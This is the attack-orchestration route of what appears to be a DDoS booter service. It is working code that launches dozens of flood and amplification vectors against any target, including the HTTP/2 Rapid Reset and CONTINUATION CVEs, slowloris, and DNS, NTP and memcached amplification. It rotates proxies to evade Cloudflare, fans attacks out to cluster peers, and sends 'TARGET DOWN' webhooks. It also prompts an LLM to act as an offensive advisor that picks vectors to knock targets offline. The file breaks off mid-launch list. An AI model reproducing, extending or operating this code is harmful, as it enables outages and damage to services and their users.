/**
 * ATTACKS ROUTE
 *
 * Orchestrates attacks using worker_threads — one worker per CPU core.
 * Each worker runs its own Node.js event loop, dgram UDP sockets, net TCP
 * sockets, and fetch HTTP calls in complete isolation.
 *
 * With 8 CPU cores:
 *   • UDP flood  → 8 × ~200K pkts/s  = ~1.6M pkts/s
 *   • HTTP flood → 8 × ~1200 req/s   = ~9600 req/s
 *   • Geass Ovrd → 8 × triple vector = massive concurrent load
 */
import { Router, type IRouter } from "express";
import { eq, sql, desc } from "drizzle-orm";
import { db, attacksTable } from "@workspace/db";
import { attackLimiter } from "../middlewares/rateLimit.js";
import { Worker } from "worker_threads";
import os   from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  CreateAttackBody,
  GetAttackParams,
  DeleteAttackParams,
  StopAttackParams,
} from "@workspace/api-zod";
import { proxyCache } from "./proxies.js";
import { CLUSTER_NODES } from "./cluster.js";

// ── Cluster fan-out — fires geass-override to all peer nodes (fire & forget) ─
function fanOutToCluster(target: string, port: number, method: string, duration: number, threads: number): void {
  if (CLUSTER_NODES.length === 0) return;
  for (const nodeUrl of CLUSTER_NODES) {
    void fetch(`${nodeUrl.replace(/\/$/, "")}/api/attacks?peer=1`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ target, port, method, duration, threads }),
      signal:  AbortSignal.timeout(8000),
    }).catch(() => { /* peer may be unreachable — ignore */ });
  }
}

const router: IRouter = Router();

// ── Worker file path (resolved relative to this bundle) ───────────────────
const WORKER_FILE = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "attack-worker.mjs",
);

// ── Live in-memory connection counter (slowloris + conn-flood) ─────────────
export const attackLiveConns = new Map<number, number>();

// ── Attack end-time tracking — used to correctly compute remaining time on Extend ──
// Stores absolute epoch-ms when each attack is scheduled to stop.
const attackEndTimes = new Map<number, number>();

// ── In-memory live stats (no DB latency) ───────────────────────────────────
// Accumulated since attack start — never reset until attack ends
const livePackets   = new Map<number, number>(); // total packets in memory
const liveBytes     = new Map<number, number>(); // total bytes in memory
// Snapshot from last rate window (updated every 1s by the rate timer)
const livePps       = new Map<number, number>(); // current pps
const liveBps       = new Map<number, number>(); // current bps
// Previous snapshot for delta calculation
const prevPktsSnap  = new Map<number, number>();
const prevBytesSnap = new Map<number, number>();
// Ring buffer of last 120 samples per attack (2 min @ 1s tick): { t, pps, bps, conns }
interface TimeseriesSample { t: number; pps: number; bps: number; conns: number }
const liveTimeseries = new Map<number, TimeseriesSample[]>();
const TIMESERIES_MAX = 120;

// T003: Response code telemetry — accumulated from worker "codes" messages
interface LiveCodes { ok: number; redir: number; client: number; server: number; timeout: number }
const liveResponseCodes = new Map<number, LiveCodes>();  // per attack-id
const liveLatAvgMs      = new Map<number, number>();     // running avg latency per attack

// ── DB write batcher — accumulate deltas, flush every 500ms ────────────────
// Prevents ~140 concurrent DB writes/s during Geass Override (21+ vectors × 300ms flush)
const dbBatchPkts  = new Map<number, number>();
const dbBatchBytes = new Map<number, number>();

setInterval(async () => {
  if (dbBatchPkts.size === 0) return;
  // Atomic swap: grab BOTH maps' contents in one pass then clear both —
  // prevents the race where a worker message lands between the two .clear() calls
  // and its stats are counted in pkts but not bytes (or vice versa).
  const snapshot: [number, number, number][] = [];
  for (const [id, pkts] of dbBatchPkts) {
    snapshot.push([id, pkts, dbBatchBytes.get(id) ?? 0]);
  }
  dbBatchPkts.clear();
  dbBatchBytes.clear();
  for (const [id, pkts, bytes] of snapshot) {
    addStats(id, pkts, bytes).catch(err =>
      console.warn(`[DB-BATCHER] addStats failed for attack ${id}:`, err instanceof Error ? err.message : err)
    );
  }
}, 500);

// Rate calculator — updates pps/bps from in-memory totals every second
setInterval(() => {
  for (const [id, total] of livePackets.entries()) {
    const prev  = prevPktsSnap.get(id) ?? 0;
    const delta = Math.max(0, total - prev);
    prevPktsSnap.set(id, total);
    livePps.set(id, delta);
  }
  for (const [id, total] of liveBytes.entries()) {
    const prev  = prevBytesSnap.get(id) ?? 0;
    const delta = Math.max(0, total - prev);
    prevBytesSnap.set(id, total);
    liveBps.set(id, delta);
  }
  // Push timeseries sample for every running attack
  const now = Date.now();
  for (const id of attackAborts.keys()) {
    let series = liveTimeseries.get(id);
    if (!series) { series = []; liveTimeseries.set(id, series); }
    series.push({
      t:     now,
      pps:   livePps.get(id) ?? 0,
      bps:   liveBps.get(id) ?? 0,
      conns: attackLiveConns.get(id) ?? 0,
    });
    if (series.length > TIMESERIES_MAX) series.shift();
  }
}, 1000);

// ── CPU count (how many parallel workers to spawn) ────────────────────────
const CPU_COUNT = Math.max(1, os.cpus().length);

// ── OOM Guard — cap workers per pool in dev to prevent container kill ──────
// Replit dev containers: ~2GB RAM shared.
// DETECTION: REPLIT_DEPLOYMENT is set ONLY in deployed (production) containers.
// In deployed: REPLIT_DEPLOYMENT=1 → no cap, full power (8-32GB dedicated).
// In dev:      absent → strict caps to keep container alive.
const IS_DEPLOYED = Boolean(process.env.REPLIT_DEPLOYMENT);
const MAX_WORKERS_PER_POOL = IS_DEPLOYED ? 999 : 1;

// Dev: clamp in-worker thread concurrency so each worker opens fewer sockets.
// Deployed: uncapped — the workers' async I/O is the bottleneck, not RAM.
const DEV_MAX_THREADS = 64;

// Dev: limit total concurrent worker_threads across ALL attack pools.
// 14 workers × 48MB heap = ~672MB peak — safe for 2GB containers.
// Deployed: no limit.
let _activeWorkers = 0;
const MAX_TOTAL_WORKERS_DEV = IS_DEPLOYED ? Infinity : 14;

// ── Webhook ────────────────────────────────────────────────────────────────
async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect, event = "attack_finished") {
  try {
    const payload = {
      event,
      attack,
      timestamp: new Date().toISOString(),
      embeds: [{
        title: event === "target_down" ? "🔴 TARGET DOWN — LELOUCH BRITANNIA" : "✅ ATTACK FINISHED — LELOUCH BRITANNIA",
        description: event === "target_down"
          ? `Target **${attack.target}** confirmed OFFLINE`
          : `Attack against **${attack.target}** has completed`,
        color: event === "target_down" ? 0xFF0000 : 0x00FF41,
        fields: [
          { name: "Target",       value: attack.target,              inline: true },
          { name: "Method",       value: attack.method,              inline: true },
          { name: "Duration",     value: `${attack.duration}s`,      inline: true },
          { name: "Packets Sent", value: String(attack.packetsSent), inline: true },
          { name: "Bytes Sent",   value: String(attack.bytesSent),   inline: true },
          { name: "Status",       value: attack.status,              inline: true },
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "Lelouch Britannia — ARES OMNIVECT ∞" },
      }],
    };
    await fetch(url, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(5000),
    });
  } catch (err) {
    console.warn(`[WEBHOOK] Failed to fire webhook to ${url}:`, err instanceof Error ? err.message : err);
  }
}

// ── Kill webhook: fire when target confirmed down (called from panel /api/notify) ──
// ── Scheduled attacks — in-memory queue with 10s polling ──────────────────
interface ScheduledAttack {
  id: string; target: string; port: number; method: string;
  duration: number; threads: number; webhookUrl?: string;
  scheduledFor: number; createdAt: number;
}
const scheduledAttacks = new Map<string, ScheduledAttack>();

// Poll every 10s — fire scheduled attacks that are due
setInterval(async () => {
  const now = Date.now();
  for (const [sid, sa] of scheduledAttacks.entries()) {
    if (now >= sa.scheduledFor) {
      scheduledAttacks.delete(sid);
      try {
        await fetch(`http://127.0.0.1:${process.env.PORT ?? 8080}/api/attacks`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            target: sa.target, port: sa.port, method: sa.method,
            duration: sa.duration, threads: sa.threads, webhookUrl: sa.webhookUrl,
          }),
          signal: AbortSignal.timeout(8000),
        });
      } catch { /* ignore — server may be starting */ }
    }
  }
}, 10_000);

// ── AI Advisor — live Groq-powered tactical analysis ──────────────────────
const GROQ_SYSTEM = `You are an elite offensive security AI advisor for a penetration testing platform called "Lelouch Britannia". Analyze live attack metrics and return ONLY a valid JSON object. No markdown, no explanation, no code fences.`;

/** Safely parse Groq response — strips markdown fences and finds first JSON block */
function parseGroqJSON(raw: string): Record<string, unknown> {
  // Strip markdown code fences (```json ... ```)
  let s = raw.replace(/^```(?:json)?\s*/im, "").replace(/\s*```\s*$/im, "").trim();
  // Find first complete { ... } block in case of leading/trailing text
  const a = s.indexOf("{"); const b = s.lastIndexOf("}");
  if (a !== -1 && b !== -1 && b > a) s = s.slice(a, b + 1);
  try { return JSON.parse(s); }
  catch { return { analysis: raw.length > 0 ? raw : "No analysis available." }; }
}
async function groqAdvisor(attack: typeof attacksTable.$inferSelect, pps: number, bps: number, conns: number, targetStatus: string, targetLatencyMs: number): Promise<Record<string, unknown>> {
  const apiKey = process.env.GROQ_API_KEY;
  if (!apiKey) return { error: "GROQ_API_KEY not set" };
  const msg = `LIVE METRICS — Target:${attack.target} Method:${attack.method} PPS:${pps} BPS:${bps} Conns:${conns} HTTP:${targetStatus} Latency:${targetLatencyMs}ms

Available methods: geass-override, waf-bypass, http2-flood, http-pipeline, h2-settings-storm, app-smart-flood, large-header-bomb, http2-continuation, tls-renego, ssl-death, graphql-dos, ws-flood, cache-poison, rudy-v2, dns-amp, quic-flood, hpack-bomb, doh-flood, xml-bomb, range-flood, slow-read, h2-dep-bomb, h2-data-flood, h2-storm, bypass-storm, h2-rst-burst, grpc-flood

Respond with JSON: {"analysis":"brief tactical assessment","primaryRecommendation":"specific next action","boostVector":"method_name","reduceVector":"method_name or null","severity":"low|medium|high|critical","estimatedDownIn":"time estimate or null","tip":"one advanced tip","effectiveness":0-100}`;
  const resp = await fetch("https://api.groq.com/openai/v1/chat/completions", {
    method: "POST",
    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${apiKey}` },
    body: JSON.stringify({
      model: "llama-3.3-70b-versatile",
      messages: [{ role: "system", content: GROQ_SYSTEM }, { role: "user", content: msg }],
      max_tokens: 400, temperature: 0.2,
      response_format: { type: "json_object" },
    }),
    signal: AbortSignal.timeout(15_000),
  });
  const data = await resp.json() as { choices?: [{ message?: { content?: string } }]; error?: { message?: string } };
  if (data.error) throw new Error(data.error.message ?? "Groq API error");
  return parseGroqJSON(data?.choices?.[0]?.message?.content ?? "{}");
}

// ── Standalone AI Advisor (no attack required) — probe + analyse ──────────
async function groqAdvisorTarget(target: string): Promise<Record<string, unknown>> {
  const apiKey = process.env.GROQ_API_KEY;
  if (!apiKey) return { error: "GROQ_API_KEY not set" };
  // Quick probe
  let targetStatus = "unknown"; let targetLatencyMs = 0;
  try {
    const t0 = Date.now();
    const url = target.startsWith("http") ? target : `https://${target}/`;
    const pr = await fetch(url, { signal: AbortSignal.timeout(5000), headers: { "User-Agent": "Mozilla/5.0" } });
    targetLatencyMs = Date.now() - t0; targetStatus = String(pr.status);
  } catch { targetStatus = "offline"; }
  const msg = `PRE-ATTACK RECON — Target:${target} HTTP:${targetStatus} Latency:${targetLatencyMs}ms
Available methods: geass-override, waf-bypass, http2-flood, http-pipeline, h2-settings-storm, app-smart-flood, large-header-bomb, http2-continuation, tls-renego, ssl-death, graphql-dos, ws-flood, cache-poison, rudy-v2, dns-amp, quic-flood, hpack-bomb, doh-flood, xml-bomb, range-flood, slow-read, h2-dep-bomb, h2-data-flood, h2-storm, bypass-storm, h2-rst-burst, grpc-flood
Respond with JSON: {"analysis":"brief target assessment","primaryRecommendation":"best starting vector","boostVector":"method_name","severity":"low|medium|high|critical","estimatedDownIn":"rough estimate","tip":"one advanced tip","effectiveness":0-100,"targetStatus":"${targetStatus}","latencyMs":${targetLatencyMs}}`;
  const resp = await fetch("https://api.groq.com/openai/v1/chat/completions", {
    method: "POST",
    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${apiKey}` },
    body: JSON.stringify({
      model: "llama-3.3-70b-versatile",
      messages: [{ role: "system", content: GROQ_SYSTEM }, { role: "user", content: msg }],
      max_tokens: 400, temperature: 0.2,
      response_format: { type: "json_object" },
    }),
    signal: AbortSignal.timeout(15_000),
  });
  const data = await resp.json() as { choices?: [{ message?: { content?: string } }]; error?: { message?: string } };
  if (data.error) throw new Error(data.error.message ?? "Groq API error");
  return parseGroqJSON(data?.choices?.[0]?.message?.content ?? "{}");
}

// GET /api/advisor?target=<url>  — standalone AI advisory (no active attack needed)
router.get("/advisor", async (req, res): Promise<void> => {
  const target = String(req.query.target ?? "").trim();
  if (!target) { res.status(400).json({ error: "target query param required" }); return; }
  try {
    const advice = await groqAdvisorTarget(target);
    res.json(advice);
  } catch (e) { res.status(503).json({ error: "AI advisor unavailable", detail: String(e) }); }
});

// ── DB stats accumulator — throws on error so callers can log it ─────────
async function addStats(id: number, pkts: number, bytes: number): Promise<void> {
  await db.update(attacksTable).set({
    packetsSent: sql`${attacksTable.packetsSent} + ${pkts}`,
    bytesSent:   sql`${attacksTable.bytesSent}   + ${bytes}`,
  }).where(eq(attacksTable.id, id));
}

// ── Worker stats handler: update in-memory live stats + batch for DB ───────
function onWorkerStats(id: number, pkts: number, bytes: number, conns?: number) {
  // In-memory totals — instant, no DB lag
  livePackets.set(id, (livePackets.get(id) ?? 0) + pkts);
  liveBytes.set(id,   (liveBytes.get(id)   ?? 0) + bytes);
  // Queue for batched DB write (flushed every 500ms)
  dbBatchPkts.set(id,  (dbBatchPkts.get(id)  ?? 0) + pkts);
  dbBatchBytes.set(id, (dbBatchBytes.get(id) ?? 0) + bytes);
  // Live connection counter
  if (conns !== undefined) attackLiveConns.set(id, conns);
}

// T003: Global code dispatcher registry — keyed by AbortSignal so all pools
// in a geass-override fanout report to the correct attack without param threading.
const _codeDispatchers = new Map<AbortSignal, (codes: LiveCodes, latMs: number) => void>();

// T003: Response code accumulator — called from spawnPool on code messages
function onWorkerCodes(id: number, codes: LiveCodes, latAvgMs: number): void {
  const cur = liveResponseCodes.get(id) ?? { ok: 0, redir: 0, client: 0, server: 0, timeout: 0 };
  cur.ok      += codes.ok;
  cur.redir   += codes.redir;
  cur.client  += codes.client;
  cur.server  += codes.server;
  cur.timeout += codes.timeout;
  liveResponseCodes.set(id, cur);
  // Exponential moving average for latency
  if (latAvgMs > 0) {
    const prev = liveLatAvgMs.get(id) ?? latAvgMs;
    liveLatAvgMs.set(id, Math.round(prev * 0.7 + latAvgMs * 0.3));
  }
}


// ─────────────────────────────────────────────────────────────────────────
//  SPAWN POOL — spawns numWorkers workers for a single method
// ─────────────────────────────────────────────────────────────────────────
const HTTP_PROXY_METHODS = new Set([
  // L7 HTTP methods — full proxy rotation (HTTP + SOCKS5)
  "http-flood", "http-bypass", "http-pipeline",
  // L7 application-layer attacks — proxy-aware
  "graphql-dos", "cache-poison", "rudy-v2",
  // TLS/H2 methods — HTTP CONNECT + SOCKS5 tunnel
  "http2-flood", "http2-continuation", "hpack-bomb", "ssl-death", "tls-renego",
  "conn-flood", "ws-flood", "h2-settings-storm", "waf-bypass",
  // New ARES OMNIVECT ∞ vectors — all L7, benefit from IP rotation
  "slow-read", "range-flood", "xml-bomb", "h2-ping-storm",
  "http-smuggling", "doh-flood", "keepalive-exhaust",
  "app-smart-flood", "large-header-bomb", "http2-priority-storm",
  // Geass vectors — must rotate via proxy to bypass Cloudflare IP filtering
  "geass-override", "cf-bypass", "nginx-killer", "h2-rst-burst", "grpc-flood",
  "h2-storm", "pipeline-flood", "conn-flood", "slowloris",
  // Composite bypass
  "bypass-storm",
  // New vectors — benefit from IP rotation
  "tls-session-exhaust", "cache-buster",
  // New H2 vector methods (2025)
  "h2-dep-bomb", "h2-data-flood",
]);

function spawnPool(
  method: string, target: string, port: number, threads: number,
  numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
  onCodes?: (codes: LiveCodes, latAvgMs: number) => void,
): Promise<void> {
  // OOM Guard 1: cap workers per pool
  numWorkers = Math.min(numWorkers, MAX_WORKERS_PER_POOL);

  // OOM Guard 2: global total worker cap in dev
  if (!IS_DEPLOYED && _activeWorkers >= MAX_TOTAL_WORKERS_DEV) {
    // Skip this pool — too many workers already running
    return Promise.resolve();
  }

  // OOM Guard 3: clamp threads per worker in dev to limit in-flight socket count
  if (!IS_DEPLOYED) {
    threads = Math.min(threads, DEV_MAX_THREADS);
  }

  const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
  const workers: Worker[] = [];
  const workerConns = new Array<number>(numWorkers).fill(0);
  // Pass ALL fastest proxies (HTTP + SOCKS5) to workers for maximum IP rotation
  const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
    ? proxyCache.map(p => ({ host: p.host, port: p.port, type: p.type as "http" | "socks5" | undefined, username: p.username, password: p.password }))
    : [];

  return new Promise<void>((resolve) => {
    const finished = new Set<number>();
    let resolved = false;
    const tryResolve = () => {
      if (!resolved && finished.size >= numWorkers) {
        resolved = true;
        _activeWorkers = Math.max(0, _activeWorkers - numWorkers);
        resolve();
      }
    };

    for (let i = 0; i < numWorkers; i++) {
      // Re-check global cap for each worker (burst mode can push us over)
      if (!IS_DEPLOYED && _activeWorkers >= MAX_TOTAL_WORKERS_DEV) {
        finished.add(i);
        tryResolve();
        continue;
      }

      const t = i === numWorkers - 1
        ? threads - threadsPerWorker * (numWorkers - 1)
        : threadsPerWorker;

      // Heap cap per worker:
      // Deployed (8-32GB RAM): 1024MB → full power, workers rarely hit this ceiling.
      // Dev (2GB total):       48MB  → 14 workers × 48 = 672MB max, safe.
      const workerOpts: import("worker_threads").WorkerOptions = {
        workerData: { method, target, port, threads: t, proxies },
        resourceLimits: { maxOldGenerationSizeMb: IS_DEPLOYED ? 1024 : 48 },
      };
      const w = new Worker(WORKER_FILE, workerOpts);
      _activeWorkers++;
      const idx = i;
      workers.push(w);

      w.on("message", (msg: { pkts?: number; bytes?: number; done?: boolean; conns?: number; codes?: LiveCodes; latAvgMs?: number }) => {
        if (msg.codes) {
          const dispatch = onCodes ?? _codeDispatchers.get(signal);
          dispatch?.(msg.codes, msg.latAvgMs ?? 0);
        }
        if (msg.pkts !== undefined && msg.bytes !== undefined) {
          if (msg.conns !== undefined) workerConns[idx] = msg.conns;
          const totalConns = workerConns.reduce((a, b) => a + b, 0);
          onStats(msg.pkts, msg.bytes, totalConns > 0 ? totalConns : undefined);
        }
        if (msg.done) { finished.add(idx); tryResolve(); }
      });
      w.on("error", () => { finished.add(idx); tryResolve(); });
      w.on("exit",  () => { finished.add(idx); tryResolve(); });
    }

    signal.addEventListener("abort", () => {
      workers.forEach(w => { try { w.postMessage("stop"); } catch { /**/ } });
      setTimeout(() => {
        workers.forEach(w => { try { w.terminate(); } catch { /**/ } });
        if (!resolved) { resolved = true; _activeWorkers = Math.max(0, _activeWorkers - numWorkers); resolve(); }
      }, 2000);
    }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  RUN ATTACK — spawns CPU_COUNT workers, each with threads/N load
// ─────────────────────────────────────────────────────────────────────────
async function runAttackWorkers(
  method: string, target: string, port: number, threads: number,
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
  id?: number, // optional — needed by Geass Override T004 adaptive burst
): Promise<void> {
  // UDP/L3 attacks: SINGLE worker with multiple sockets (multi-worker UDP can deadlock in this env)
  // quic-flood is also UDP-based (port 443/UDP)
  // icmp-flood, dns-amp, ntp-amp, mem-amp, ssdp-amp are real network attacks via dgram UDP
  const UDP_METHODS = new Set([
    "udp-flood", "udp-bypass", "quic-flood",
    "icmp-flood", "dns-amp", "ntp-amp", "mem-amp", "ssdp-amp",
  ]);
  if (UDP_METHODS.has(method)) {
    await spawnPool(method, target, port, threads, 1, signal, onStats);
    return;
  }

  // ── GEASS OVERRIDE: ARES OMNIVECT ∞ — ABSOLUTE TOTAL DEVASTATION ────────
  // ★ 30 SIMULTANEOUS ATTACK VECTORS — 32GB/8vCPU OPTIMIZED ★
  //
  // Layer 7 — Application (12 vectors):
  // Vector  1: Connection Flood        — exhaust nginx worker_connections (pre-HTTP layer)
  // Vector  2: Slowloris               — hold half-open TLS sockets, starve thread pool
  // Vector  3: HTTP/2 Rapid Reset      — CVE-2023-44487: 1000-stream RST burst, dominant CPU
  // Vector  4: H2 CONTINUATION Flood   — CVE-2024-27316: server buffers headers → OOM (nginx ≤1.25.4)
  // Vector  5: HPACK Bomb              — RFC 7541 incremental indexing table eviction storm
  // Vector  6: WAF Bypass              — JA3+AKAMAI Chrome fingerprint, evades CF/Akamai
  // Vector  7: WebSocket Exhaustion    — goroutine/thread per conn + large message frames
  // Vector  8: GraphQL Fragment Bomb   — fragment spread explosion: O(frags × fields) CPU
  // Vector  9: RUDY v2 Slow POST       — multipart/form-data 1GB body, holds server threads
  // Vector 10: Cache Poison            — CDN cache eviction, 100% origin miss rate
  // Vector 11: HTTP Bypass             — Chrome fingerprint + proxy rotation, bypasses CDN/WAF per-IP
  // Vector 12: Keepalive Exhaust       — pipeline 128 reqs/conn, holds server worker threads [NEW]
  //
  // Layer 7 — Advanced HTTP/2 (4 vectors):
  // Vector 13: H2 Settings Storm       — SETTINGS oscillation + WINDOW_UPDATE: 326K pps proved
  // Vector 14: HTTP Pipeline Flood     — HTTP/1.1 pipelining 128 req/write, 300K req/s, no wait
  // Vector 15: H2 PING Storm           — thousands of PING frames/s, server must ACK every one [NEW]
  // Vector 16: HTTP Smuggling          — TE/CL desync, poisons backend request queue [NEW]
  //
  // TLS / Crypto (3 vectors):
  // Vector 17: TLS Renegotiation       — forced public-key handshake 1000×/sec on server CPU
  // Vector 18: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
  // Vector 19: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
  //
  // Application Layer — Extended (3 vectors):
  // Vector 20: XML Bomb                — billion-laughs entity expansion to XML/SOAP endpoints [NEW]
  // Vector 21: Slow Read               — pause TCP read, fills server send buffer, thread blocked [NEW]
  // Vector 22: HTTP Range Flood        — Range: 500 × 1-byte ranges, 500× server I/O per req [NEW]
  //
  // Layer 4 — Transport (1 vector):
  // Vector 23: SYN Flood               — pure TCP SYN_RECV table exhaustion before handshake
  //
  // Layer 3 — Network/Amplification (5 vectors):
  // Vector 24: ICMP Flood              — real ICMP echo, raw-socket/hping3/UDP fallback, L3 saturation
  // Vector 25: DNS Water Torture       — floods NS servers, bypasses CDN/WAF, fills NXDOMAIN cache
  // Vector 26: NTP Flood               — real NTP mode 7 monlist + mode 3 client requests
  // Vector 27: Memcached UDP Flood     — real binary Memcached protocol to port 11211
  // Vector 28: SSDP M-SEARCH Flood     — real SSDP M-SEARCH to port 1900 (UPnP stack exhaustion)
  //
  // UDP / Volumetric (2 vectors):
  // Vector 29: UDP Flood               — raw UDP burst engine, 500K pps per worker
  // Vector 30: DNS over HTTPS Flood    — random DNS queries to /dns-query, forces recursive lookup [NEW]
  //
  // ★ ADAPTIVE BURST MODE: after 30s, top 5 vectors auto-spike to +50% threads for 10s waves
  // ★ WORKER SCALING: I/O-bound vectors → 2× CPU_COUNT workers each
  if (method === "geass-override") {
    // ── Worker counts — calibrated for stable deployment containers (4-8GB RAM) ──
    // slowloris/conn-flood each hold thousands of persistent TLS sockets → 1 worker each
    // HTTP/H2 workers are stateless (fast req/response) → scale with CPU_COUNT
    const connW    = 1;                               // 1× conn-flood (12K persistent TLS sockets each)
    const slowW    = 1;                               // 1× slowloris  (15K persistent TLS sockets each)
    const h2W      = Math.max(6, CPU_COUNT);          // ≥6 — CVE-2023-44487 (stateless, scales well)
    const contW    = Math.max(4, Math.floor(CPU_COUNT * 0.75)); // ≥4 — CVE-2024-27316 OOM
    const hpackW   = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — HPACK eviction
    const wafW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — Chrome JA4 fingerprint
    const wsW      = 1;                               // 1× WS exhaust (5K persistent WS sockets each)
    const gqlW     = 2;                               // 2× GraphQL exponential
    const rudyW    = 1;                               // 1× multipart slow POST (persistent)
    const cacheW   = 2;                               // 2× CDN cache eviction
    const tlsW     = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — RSA renegotiation CPU
    const quicW    = 1;                               // 1× QUIC/H3 UDP
    const sslW     = 2;                               // 2× SSL Death Record
    const stormW   = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — H2 Settings Storm
    const pipeW    = Math.max(6, CPU_COUNT);          // ≥6 — HTTP Pipeline (stateless, high throughput)
    const bypassW  = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — Chrome bypass
    const kaW      = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — Keepalive exhaust
    const pingW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — H2 PING storm
    const smugW    = 2;                               // 2× HTTP smuggling
    const xmlW     = 1;                               // 1× XML bomb (CPU-bound, 1 is enough)
    const slowRW   = 1;                               // 1× Slow Read (persistent connections)
    const rangeW   = 2;                               // 2× Range Flood
    const appW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — App Smart Flood
    const lhbW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — Large Header Bomb
    const prioW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — H2 PRIORITY Storm
    const rstW     = Math.max(4, CPU_COUNT);          // ≥4 — H2 RST Burst (CVE-2023-44487 pure)
    const grpcW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — gRPC handler exhaustion
    const synW     = 1;                               // 1× SYN flood (UDP-like, 1 is enough)
    // L3/UDP — single worker with high socket concurrency
    const icmpW    = 1;  const dnsW = 1;  const ntpW = 1;
    const memW     = 1;  const ssdpW = 1; const udpW = 1; const dohW = 1;

    // ── Thread budget v3 — re-calibrated April 2026 (35 vectors) ────────────
    // Priority: H2 RST (CVE-2023-44487) → H2 Settings Storm → HTTP Pipeline
    // → HPACK Bomb → H2 CONTINUATION (CVE-2024-27316) → WAF Bypass → App Smart
    const connT    = Math.max(200,  Math.round(threads * 0.10)); // conn-flood (hold sockets)
    const slowT    = Math.max(200,  Math.round(threads * 0.10)); // slowloris (hold threads)
    const h2T      = Math.max(1200, Math.round(threads * 0.70)); // ★★★★ CVE-2023-44487 RST — most impactful
    const contT    = Math.max(900,  Math.round(threads * 0.50)); // ★★★ CVE-2024-27316 OOM — many servers unpatched
    const hpackT   = Math.max(700,  Math.round(threads * 0.40)); // ★★★ HPACK eviction CPU storm
    const wafT     = Math.max(600,  Math.round(threads * 0.40)); // ★★★ Chrome JA4 fingerprint bypass
    const wsT      = Math.max(200,  Math.round(threads * 0.10)); // WS goroutine exhaust
    const gqlT     = Math.max(100,  Math.round(threads * 0.07)); // GraphQL resolver explosion
    const udpT     = Math.max(150,  Math.round(threads * 0.08)); // UDP bandwidth
    const rudyT    = Math.max(100,  Math.round(threads * 0.09)); // RUDY slow POST
    const cacheT   = Math.max(100,  Math.round(threads * 0.07)); // CDN cache eviction
    const tlsT     = Math.max(100,  Math.round(threads * 0.07)); // TLS RSA renegotiation
    const quicT    = Math.max(80,   Math.round(threads * 0.05)); // QUIC state alloc
    const sslT     = Math.max(200,  Math.round(threads * 0.10)); // SSL Death Record (1-byte TLS)
    const stormT   = Math.max(1000, Math.round(threads * 0.58)); // ★★★★ H2 Settings Storm — nginx killer
    const pipeT    = Math.max(1800, Math.round(threads * 0.82)); // ★★★★ HTTP/1.1 Pipeline — saturates keep-alive pool
    const bypassT  = Math.max(300,  Math.round(threads * 0.22)); // Chrome L7 bypass
    const kaT      = Math.max(200,  Math.round(threads * 0.15)); // Keepalive exhaustion
    const pingT    = Math.max(500,  Math.round(threads * 0.32)); // ★★★ H2 PING storm (WINDOW_UPDATE flood)
    const smugT    = Math.max(100,  Math.round(threads * 0.10)); // HTTP request smuggling
    const xmlT     = Math.max(80,   Math.round(threads * 0.06)); // XML billion-laughs
    const slowRT   = Math.max(100,  Math.round(threads * 0.09)); // Slow Read TCP window
    const rangeT   = Math.max(150,  Math.round(threads * 0.12)); // HTTP Range I/O amplification
    const synT     = Math.max(400,  Math.round(threads * 0.15)); // SYN flood
    // L3/UDP — each gets its own high-throughput socket pool
    const icmpT    = Math.max(400,  Math.round(threads * 0.15)); // ICMP echo flood
    const dnsT     = Math.max(500,  Math.round(threads * 0.12)); // DNS Water Torture (NS servers)
    const ntpT     = Math.max(400,  Math.round(threads * 0.09)); // NTP mode 7 monlist
    const memT     = Math.max(200,  Math.round(threads * 0.07)); // Memcached binary UDP
    const ssdpT    = Math.max(200,  Math.round(threads * 0.07)); // SSDP M-SEARCH UPnP
    const dohT     = Math.max(100,  Math.round(threads * 0.06)); // DoH recursive flood
    const appT     = Math.max(600,  Math.round(threads * 0.35)); // ★★★ App Smart Flood (session-aware)
    const lhbT     = Math.max(500,  Math.round(threads * 0.28)); // ★★★ Large Header Bomb (header table OOM)
    const prioT    = Math.max(400,  Math.round(threads * 0.28)); // ★★★ H2 PRIORITY Storm (dep-tree CPU)
    const rstT     = Math.max(800,  Math.round(threads * 0.55)); // ★★★★ H2 RST Burst — pure CVE-2023-44487
    const grpcT    = Math.max(300,  Math.round(threads * 0.20)); // ★★★ gRPC flood — separate thread pool

    const geassConnsPerPool = new Map<string, number>();
    const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
      if (c !== undefined) {
        geassConnsPerPool.set(poolKey, c);
        const total = [...geassConnsPerPool.values()].reduce((a, v) => a + v, 0);
        onStats(p, b, total);
      } else {
        onStats(p, b);
      }
    };

    // ── Launch all 35 vectors simultaneously (ARES OMNIVECT ∞ v2) ────────────────
    const geassPromise = Promise.all([
      // L7 Application (12 vectors)
      spawnPool("conn-flood",          target, port, connT,   connW,   signal, makeGeassOnStats("conn")),
      spawnPool("slowloris",           target, port, slowT,   slowW,   signal, makeGeassOnStats("slow")),
